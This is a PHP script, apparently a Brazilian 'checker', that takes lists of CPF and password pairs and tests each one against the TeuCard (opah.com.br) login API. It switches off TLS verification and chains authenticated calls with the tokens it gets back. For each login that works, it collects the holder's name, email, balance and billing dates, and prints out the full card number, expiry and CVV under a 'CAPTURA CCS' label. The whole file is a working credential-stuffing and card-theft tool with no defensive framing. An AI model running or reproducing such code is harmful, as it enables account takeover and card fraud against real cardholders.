<?php


// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// ================================================================


$hoje = date("H:i:s - d/m/Y");

    
    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }


    $lista = $_GET['lista'];
    $cpf = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];



    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}

    function metraianumeros($size){
    $str = '';
    $numbes = '0123456789';
    for ($i=0; $i < $size; $i++) { 
   $str.= $numbes[rand(0, strlen($numbes) - 1)];
    }
    return $str;
    }


    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}




$metralhagostoso = substr($lista, 0, 8);

if (($metralhagostoso == 'Aprovada') or ($metralhagostoso == 'Aprovado')!== false) {

    die(json_encode(array("Error" => "Vai se foder kkkkkkk.", "Mensagemdometralha" => "Aqui nao amador...!")));

}

$contador_caracteres = strlen($lista);

if ($contador_caracteres < 3 ) {

    die('#Error => Invalido. Numero de caracteres abaixo do especificado..! [Digitados: '.$contador_caracteres.']');

}



$header_login = array (

'accept: */*',
'content-type: application/json',
'origin: https://teucard.opah.com.br',
'referer: https://teucard.opah.com.br/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0'


);


$post_login = '{"cpf":"'.$cpf.'","senha":"'.$senha.'"}';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, 'https://finan-teucard.opah.com.br/v1/usuarios/auth/login-cliente');
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_login);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_login);
$login = curl_exec($ini);
$token_bearrer = metraiapuxar($login, '"novoToken":"','"', 1);
$token_login = metraiapuxar($login, '"token":"','"', 1);
$token_cartao = metraiapuxar($login, '"tokenCartao":"','"', 1);
//$id_conta = metraiapuxar($login, '"id":"','","idCliente', 1); // ATIVE CASO PRECISAR DESSE VALOR.


$decod_login = json_decode($login, true);

$retorno = $decod_login['mensagem'];
$email_conta = $decod_login['email'];
$nome_titular = $decod_login['nomeTitular'];
$verificar_cc = $decod_login['tokenCartao'];


if (is_null($verificar_cc)!== false ) {

    $consultar_cc = "NÃO";

} else {

    $consultar_cc = "SIM";

}


$header_extratocc = array (

'accept: */*',
'apikey: token '.$token_login.'',
'authorization: Bearer '.$token_bearrer.'',
'content-type: application/json',
'origin: https://teucard.opah.com.br',
'referer: https://teucard.opah.com.br/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0'

);


$post_extratocc = '{"tokenCartao":"'.$token_cartao.'"}';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, 'https://finan-teucard.opah.com.br/v1/autorizador/extrato/3');
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_extratocc);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_extratocc);
$extrato_cartao = curl_exec($ini);


$decod_extrato = json_decode($extrato_cartao, true);

$melhordiacompra = $decod_extrato['melhorDia'];
$fechamentofatura = $decod_extrato['dataFechamento'];
$vencimentofatuuura = $decod_extrato['dataVencimento'];

## INFORMACOES DETALHADAS DO CARTAO.

$limitedisponivelcc = $decod_extrato['saldo'];



$header_status = array (

'accept: */*',
'apikey: token '.$token_login.'',
'authorization: Bearer '.$token_bearrer.'',
'content-type: application/json',
'origin: https://teucard.opah.com.br',
'referer: https://teucard.opah.com.br/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0'

);

$post_status = 'tokenCartao='.$token_cartao.'';



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, 'https://finan-teucard.opah.com.br/v1/produtos/listar-produtos-cliente/'.$cpf.'?tokenCartao='.$token_cartao.'');
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_status);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_status);
$status_cc = curl_exec($ini);

$decod_status = json_decode($status_cc, true)['produtosCliente'][0];

$status_atividadecc = $decod_status['statusTeuCard'];



$header_infodacc = array (

'accept: */*',
'apikey: token '.$token_login.'',
'authorization: Bearer '.$token_bearrer.'',
'content-type: application/json',
'origin: https://teucard.opah.com.br',
'referer: https://teucard.opah.com.br/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0'

);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, 'https://finan-teucard.opah.com.br/v1/clientes/buscar-cliente-cpf/'.$cpf.'');
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ini, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_infodacc);
$detalhes_cc = curl_exec($ini);

$decod_detalhescc = json_decode($detalhes_cc, true)['cartaoAtual'];

$numerocc = $decod_detalhescc['numeroCartao'];
$mescc = $decod_detalhescc['mesExpiracao'];
$anocc = $decod_detalhescc['anoExpiracao'];
$cvv_cc = $decod_detalhescc['codigoSeguranca'];

$limite_cartao = $decod_detalhescc['limiteCredito'];

$bloqueado_cc = metraiapuxar($detalhes_cc, '"bloqueado":',',', 1);




if (is_null($numerocc)!== false ) {

    $verificar_numerocc = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_numerocc = ''.$numerocc.'';

}


if (is_null($mescc)!== false ) {

    $verificar_mescc = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_mescc = ''.$mescc.'';
    
}


if (is_null($anocc)!== false ) {

    $verificar_anocc = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_anocc = ''.$anocc.'';
    
}


if (is_null($cvv_cc)!== false ) {

    $verificar_cvvcc = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_cvvcc = ''.$cvv_cc.'';
    
}


if (is_null($limite_cartao)!== false ) {

    $verificar_creditocc = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_creditocc = ''.$limite_cartao.'';
    
}


if ($bloqueado_cc == 'false') {

    $verificar_blockcc = "NÃO";

} else {

    $verificar_blockcc = "SIM";

}



if (is_null($status_atividadecc)!== false ) {

    $verificar_status = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_status = ''.$status_atividadecc.'';

}



if (is_null($melhordiacompra)!== false ) {

    $verificar_melhordia = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_melhordia = ''.$melhordiacompra.'';

}


if (is_null($fechamentofatura)!== false ) {

    $verificar_fechamentofatura = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_fechamentofatura = ''.$fechamentofatura.'';

}


if (is_null($vencimentofatuuura)!== false ) {

    $verificar_vencfatura = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_vencfatura = ''.$vencimentofatuuura.'';

}



if (is_null($limitedisponivelcc)!== false ) {

    $verificar_limitecc = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_limitecc = ''.$limitedisponivelcc.'';

}



if (is_null($retorno)!== false ) {

    $verificar_retorno = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_retorno = ''.$retorno.'';

}


if (is_null($email_conta)!== false ) {

    $verificar_email = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_email = ''.$email_conta.'';

}

if (is_null($nome_titular)!== false ) {

    $verificar_nome = "Houve uma falha, ao obter resultados.";

} else {

    $verificar_nome = ''.$nome_titular.'';

}



$detalhes_do_cartao = "<span class='badge badge-warning'>CARTAO:</span> $verificar_numerocc  <span class='badge badge-warning'>MES:</span> $verificar_mescc  <span class='badge badge-warning'>ANO:</span> $verificar_anocc  <span class='badge badge-warning'>CVV:</span> $verificar_cvvcc  <span class='badge badge-warning'>LIMITE (CRÉDITO):</span> $verificar_creditocc  <span class='badge badge-warning'>CARTAO-BLOQUEADO:</span> $verificar_blockcc ";

// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//
         

if (strpos($login, '"status":"404')!== false ) {


   echo "<span class='badge badge-danger'>#Reprovada</span> $cpf|$senha <span class='badge badge-info'>Retorno:</span> $verificar_retorno <br>";


}  else if (empty($login)!== false ) {


    echo "<span class='badge badge-danger'>#Reprovada</span> $cpf|$senha <span class='badge badge-info'>Retorno:</span> N/A - Resultados. <br>";


}

else {

    echo "<span class='badge badge-success'>#Aprovada</span> $cpf|$senha  <span class='badge badge-info'>RETORNO:</span> Autenticado. <span class='badge badge-info'>NOME TITULAR:</span> $verificar_nome  <span class='badge badge-info'>EMAIL REGISTRADO:</span> $verificar_email <span class='badge badge-info'>TEM CARTAO?:</span> $consultar_cc <span class='badge badge-info'>MELHOR DIA P/ COMPRAS:</span> $verificar_melhordia  <span class='badge badge-info'>FECHAMENTO D/ FATURA:</span> $verificar_fechamentofatura  <span class='badge badge-info'>VENCIMENTO FATURA:</span> $verificar_vencfatura <span class='badge badge-info'>SALDO DÍSPONIVEL (CC):</span> $verificar_limitecc <span class='badge badge-info'>STATUS CARTÃO:</span> $verificar_status [ <span class='badge badge-dark'>CAPTURA CCS</span>  $detalhes_do_cartao ] <br>";

 
}
?>